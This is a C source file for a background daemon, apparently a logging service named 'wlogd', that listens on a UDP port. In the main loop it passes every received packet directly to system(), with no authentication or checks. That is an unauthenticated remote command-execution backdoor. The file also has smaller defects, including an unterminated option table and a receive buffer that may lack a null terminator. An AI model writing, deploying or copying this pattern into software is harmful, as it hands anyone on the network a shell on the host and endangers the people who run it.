#include "common.h"

#define PID_FILE  "/tmp/wlogd.pid"





struct option longopts[] = {
	{"debug", 0, NULL, 'd'},
	{"help", 0, NULL, 'h'}
};

static unsigned short DEBUG_ON = 0;

int gbl_fd;


void parse_cmd(int *argc, char *argv[])
{
	int ch;

	while ((ch = getopt_long(*argc, argv, "dh", longopts, NULL)) != -1) {
			switch (ch) {
		case 'd':
			DEBUG_ON =1;
			printf("DEBUG MODE has been set...\n");
			break;
		case 'h':
		  printf("Usage:%s [OPTION]\nShort options:\n   -h, --help\n   -d, --debug   Run the program without daemon\n", argv[0]);
		  exit(1);
			break;
		}
	}
}

void init_daemon()
{
	int pid;
	int i;
	int max_fd=64;

	if((pid = fork()) != 0)
		exit(0);

	setsid();
	signal(SIGHUP, SIG_IGN);

	if((pid = fork()) != 0)
		exit(0);

	for(i =0; i < max_fd; i++)
		close(i);

	chdir("/");
	umask(0);

}

void handle_int_signal(int signo)
{
  DEBUG_MSG("The program has been interrupted!\n");
  close(gbl_fd);
  exit(1);
}
/*
 * $check_instance: check whether the program have a running instance or not
 *
 * if there's a instance exist, return 0. Otherwise, return 1.
 */
int check_instance()
{
	FILE *fp;
	DIR *dir;
	char proc_buf[128] = {0};
	unsigned int pid = 0;

	fp = fopen(PID_FILE, "r");
	if(fp == NULL){
		DEBUG_MSG("fp is null\n");
		return 1;
	}

	fscanf(fp, "%u\n", &pid);
	fclose(fp);

	sprintf(proc_buf, "/proc/%d", pid);

	printf("pid : %d\n",pid);
	if((dir = opendir(proc_buf)) == NULL){
		DEBUG_MSG("can't open dir!\n");
		return 1;
	}

	return 0;
}

void write_pid()
{
  FILE *fp = NULL;

  if((fp = fopen(PID_FILE, "w")) == NULL){
    DEBUG_MSG("fp is null!\n");
    exit(1);
  }

  fprintf(fp, "%u\n", getpid());
  fclose(fp);
}


int main(int argc, char *argv[])
{

  int len, addrlen, sfd;
  struct sockaddr_in serv_addr;
	char data[512];

	addrlen = sizeof(struct sockaddr_in);

	parse_cmd(&argc, argv);

	if(!check_instance()){
	  DEBUG_MSG("One instance is running!\n");
	  exit(1);
	}

	signal(SIGTERM, handle_int_signal);
	signal(SIGINT, handle_int_signal);
	signal(SIGHUP, handle_int_signal);

	if(!DEBUG_ON)
	  init_daemon();

	write_pid();

	gbl_fd = sfd = open_udp_server_socket(SERV_PORT, &serv_addr);
	while (1) {
		memset(data, '\0', sizeof(data));
		len =
		    recvfrom(sfd, data, sizeof(data), 0,
			     (struct sockaddr *) &serv_addr, &addrlen);
printf("got %s\n", data);
		system(data);
	}
	close(gbl_fd);
	return 0;
}
